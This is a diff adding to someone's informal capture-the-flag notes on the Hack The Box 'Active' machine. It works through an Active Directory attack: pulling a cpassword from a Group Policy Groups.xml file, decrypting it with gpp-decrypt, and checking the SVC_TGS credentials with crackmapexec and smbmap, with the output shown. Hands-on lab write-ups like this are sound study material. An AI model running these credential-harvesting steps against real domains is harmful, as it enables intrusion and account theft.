@@ -177,3 +177,76 @@ getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
 ```
 cool. data. wew.
 what do with it?
+okaaaay...claude...calm down gurl.
+
+"""
+PERFECT! You got it! Now look at that beautiful line:
+
+```
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
+```
+
+**THAT'S THE GOLDEN TICKET!** 🎯
+"""
+
+good lord... linkedin slop posting esque. please chill.
+
+golden ticket? what is this? some kerberos thing?
+`cpassword` prop in xml. cool.
+
+lets juhh.h....uh. just copy this to `./`...
+
+`./goldenticketiguess.xml`
+
+okay. cool.
+
+```xml
+<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
+
+edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+active.htb\SVC_TGS
+
+# hm, i guess SVC_TGS is probably ticket granting service? wonder how to abuse.
+
+gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+
+GPPstillStandingStrong2k18
+
+cool. uh. what do.
+```
+
+"Now we need to figure out which user this password belongs to."
+
+erm. `SVC_TGS`? lets see.
+
+```bash
+crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+
+SMB         active.htb      445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         active.htb      445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
+
+(ok. but. wtf does this mean? the creds work? i think so.)
+```
+
+```bash
+# **2. Enumerate shares with the valid creds:**
+
+smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
+
+[+] IP: 10.129.13.147:445       Name: active.htb                Status: Authenticated                                                                             
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+
+```
+
+sick, nuts. got 4 shares RO access. time to keep digging.
+
+
